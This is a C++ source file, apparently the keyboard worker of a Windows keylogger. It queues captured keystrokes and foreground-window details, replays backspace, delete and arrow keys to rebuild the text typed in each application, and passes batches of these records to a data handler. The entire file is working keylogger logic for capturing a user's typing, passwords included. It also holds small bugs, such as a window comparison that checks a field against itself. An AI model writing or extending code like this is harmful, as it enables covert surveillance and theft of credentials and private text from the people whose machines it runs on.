#include "kbdworker.hpp"
#include "lrcdatahandler.hpp"
#include "winfx.hpp"
#include "tools.hpp"
#include "settings.hpp"

#include <thread>
#include <mutex>
#include <atomic>
#include <chrono>

#include <queue>
#include <list>

using namespace Services;
using namespace LRCData;

namespace
{
	struct KeyBundle
	{
		enum BundleType
		{
			VK_INFO,
			WND_INFO
		} type;
		VKInfo vkInfo;
		WNDInfo wndInfo;
	};

	std::atomic_bool isRunning;

	std::vector<Keyboard> kbdVector(Settings::KeyboardSvc::eventsToProcess);
	Keyboard pendingKeyboard;

	std::queue<KeyBundle> keyBundleQueue;

	std::mutex stateMutex;
	std::mutex keyBundleQueueMutex;

	std::thread workerThread;

	size_t kbdVectorCursor;

	size_t pkListCursorBegin;
	size_t pkListCursor;

	size_t vkRepeats;

	VKInfo lastVKInfo;

	LRCDataWriter writer(Settings::sha256ID);

	// Compares two VKInfo structures
	inline bool VKInfoCmp(VKInfo vk1, VKInfo vk2)
	{
		return (vk1.keyCode == vk2.keyCode && vk1.lang == vk2.lang && vk1.flags == vk2.flags);
	}

	// Compares two WNDInfo structures
	inline bool WNDInfoCmp(WNDInfo wnd1, WNDInfo wnd2)
	{
		return (wnd1.title == wnd2.title && wnd2.process == wnd2.process);
	}

	// Is virtual key appends text into text fields
	inline bool isprintable(const DWORD vkCode)
	{
		return (vkCode == 0x20)						// Spacebar
			|| (vkCode >= 0x30 && vkCode <= 0x5A)	// 0 - 9, A - Z
			|| (vkCode >= 0x60 && vkCode <= 0x6F)	// Numpad keys
			|| (vkCode >= 0xBA && vkCode <= 0xE2);	// Different signs ([]'\;/.`)
	}

	void init()
	{
		kbdVectorCursor = 0;

		pkListCursorBegin = 0;
		pkListCursor = 0;

		vkRepeats = 0;

		lastVKInfo.keyCode = 0;
		lastVKInfo.lang = 0;
		lastVKInfo.flags = 0;

		pendingKeyboard.wndInfo = tools::GetWNDInfo(GetForegroundWindow());
	}

	void saveList()
	{
		ByteVector result = writer.GetBytes(kbdVector);
		LRCDataHandler::Process(result);

		init();
	}

	void resetCursor()
	{
		pkListCursor = pkListCursorBegin = pendingKeyboard.keys.size();
	}

	void eraseLeft()
	{
		if (pkListCursor > pkListCursorBegin)
		{
			std::list<VKInfo>::iterator it = pendingKeyboard.keys.begin();
			std::advance(it, pkListCursor - 1);
			pendingKeyboard.keys.erase(it);
			pkListCursor--;
		}
	}

	void eraseRigth()
	{
		if (pkListCursor < pendingKeyboard.keys.size())
		{
			std::list<VKInfo>::iterator it = pendingKeyboard.keys.begin();
			std::advance(it, pkListCursor);
			pendingKeyboard.keys.erase(it);
		}
	}

	void processVKInfo(VKInfo vkInfo)
	{
		// Filter virtual-key repeats
		if (VKInfoCmp(vkInfo, lastVKInfo))
		{
			if (vkRepeats != Settings::KeyboardSvc::maxRepeats)
			{
				vkRepeats++;
			}
			else
			{
				return;
			}
		}
		else
		{
			vkRepeats = 0;
			lastVKInfo = vkInfo;
		}

		if (isprintable(vkInfo.keyCode))
		{
			// Insert 'pk' into 'pkList'
			std::list<VKInfo>::iterator it = pendingKeyboard.keys.begin();
			std::advance(it, pkListCursor);
			pendingKeyboard.keys.insert(it, vkInfo);

			// Increment cursor counters
			pkListCursor++;
		}
	}

	void processWNDInfo(WNDInfo wndInfo)
	{
		if (!WNDInfoCmp(wndInfo, pendingKeyboard.wndInfo))
		{
			kbdVector[kbdVectorCursor] = pendingKeyboard;
			kbdVectorCursor++;

			if (kbdVectorCursor == Settings::KeyboardSvc::eventsToProcess)
			{
				saveList();
			}

			pendingKeyboard.wndInfo = wndInfo;
			pendingKeyboard.keys.clear();
			resetCursor();
		}
	}

	void processKeyBundle(KeyBundle keyBundle)
	{
		switch (keyBundle.type)
		{
		case KeyBundle::VK_INFO:
			switch (keyBundle.vkInfo.keyCode)
			{
			case VK_BACK:
				eraseLeft();
				break;
			case VK_DELETE:
				eraseRigth();
				break;
			case VK_UP:
				// Point cursor to the start
				pkListCursor = pkListCursorBegin;
				break;
			case VK_DOWN:
				// Point cursor to the end
				pkListCursor = pendingKeyboard.keys.size();
				break;
			case VK_LEFT:
				// Shift virtual-key cursor to left if cursor isn't at begining
				if (pkListCursor > pkListCursorBegin)
				{
					pkListCursor--;
				}
				break;
			case VK_RIGHT:
				// Shift virtual-key cursor to right if cursor isn't at end
				if (pkListCursor < pendingKeyboard.keys.size())
				{
					pkListCursor++;
				}
				break;
			default:
				processVKInfo(keyBundle.vkInfo);
				break;
			}
			break;
		case KeyBundle::WND_INFO:
			processWNDInfo(keyBundle.wndInfo);
			break;
		}
	}

	void worker()
	{
		while (isRunning.load())
		{
			keyBundleQueueMutex.lock();
			bool pkQueueEmpty = keyBundleQueue.empty();
			keyBundleQueueMutex.unlock();

			if (!pkQueueEmpty)
			{
				keyBundleQueueMutex.lock();
				KeyBundle keyBundle = keyBundleQueue.front();
				keyBundleQueue.pop();
				keyBundleQueueMutex.unlock();

				processKeyBundle(keyBundle);

				std::this_thread::sleep_for(std::chrono::milliseconds(5));
			}
			else
			{
				std::this_thread::sleep_for(std::chrono::milliseconds(50));
			}
		}
	}
}

void KeyboardWorker::Run()
{
	stateMutex.lock();

	if (isRunning.load())
	{
		return;
	}

	isRunning.store(true);

	init();
	workerThread = std::thread(worker);

	stateMutex.unlock();
}

void KeyboardWorker::Stop()
{
	stateMutex.lock();

	if (!isRunning.load())
	{
		return;
	}

	isRunning.store(false);

	workerThread.join();

	stateMutex.unlock();
}

bool KeyboardWorker::IsRunning()
{
	return isRunning.load();
}

void KeyboardWorker::Add(VKInfo vkInfo)
{
	KeyBundle keyBundle;
	keyBundle.type = KeyBundle::VK_INFO;
	keyBundle.vkInfo = vkInfo;

	keyBundleQueueMutex.lock();
	keyBundleQueue.push(keyBundle);
	keyBundleQueueMutex.unlock();
}


void KeyboardWorker::Add(LRCData::WNDInfo wndInfo)
{
	KeyBundle keyBundle;
	keyBundle.type = KeyBundle::WND_INFO;
	keyBundle.wndInfo = wndInfo;

	keyBundleQueueMutex.lock();
	keyBundleQueue.push(keyBundle);
	keyBundleQueueMutex.unlock();
}